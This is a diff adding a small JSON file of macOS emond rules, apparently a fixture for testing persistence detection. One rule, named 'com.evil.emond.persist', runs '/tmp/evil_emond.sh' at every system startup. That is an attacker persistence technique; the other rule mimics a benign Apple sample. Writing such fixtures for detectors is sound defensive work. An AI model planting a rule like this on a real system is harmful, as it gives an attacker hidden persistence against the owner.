@@ -1,0 +1,17 @@
+{
+  "rules": [
+    {
+      "name": "com.evil.emond.persist",
+      "enabled": true,
+      "eventTypes": "startup",
+      "action": "/tmp/evil_emond.sh",
+      "command": "/tmp/evil_emond.sh"
+    },
+    {
+      "name": "com.apple.emond.sample",
+      "enabled": true,
+      "eventTypes": "auth.success",
+      "command": "/usr/libexec/emond-sample"
+    }
+  ]
+}
